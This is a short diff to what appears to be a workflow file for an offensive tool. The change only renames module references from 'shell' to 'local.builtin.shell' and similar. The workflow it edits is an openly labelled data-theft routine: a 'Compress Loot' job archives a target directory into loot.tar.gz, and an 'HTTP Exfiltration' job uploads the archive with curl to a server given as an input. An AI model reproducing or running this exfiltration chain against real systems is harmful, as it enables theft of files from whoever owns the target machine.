@@ -31,13 +31,13 @@ jobs:
     name: Compress Loot
     steps:
     - name: tar-gz
-      module: shell
+      module: local.builtin.shell
       with:
         cmd: tar -czf {{ env.OFX_RUN_DIR }}/loot.tar.gz -C {{ inputs.target }} . 2>&1
       continue-on-error: true
       log-command: '{{ inputs.log_command }}'
     - name: checksum
-      module: modules/checksum.py::run
+      module: local.checksum
       with: {}
   exfil-http:
     name: HTTP Exfiltration
@@ -46,7 +46,7 @@ jobs:
     - compress
     steps:
     - name: curl-post
-      module: shell
+      module: local.builtin.shell
       with:
         cmd: curl -X POST -F "file=@{{ env.OFX_RUN_DIR }}/loot.tar.gz" {{ inputs.server
           }}/upload 2>&1
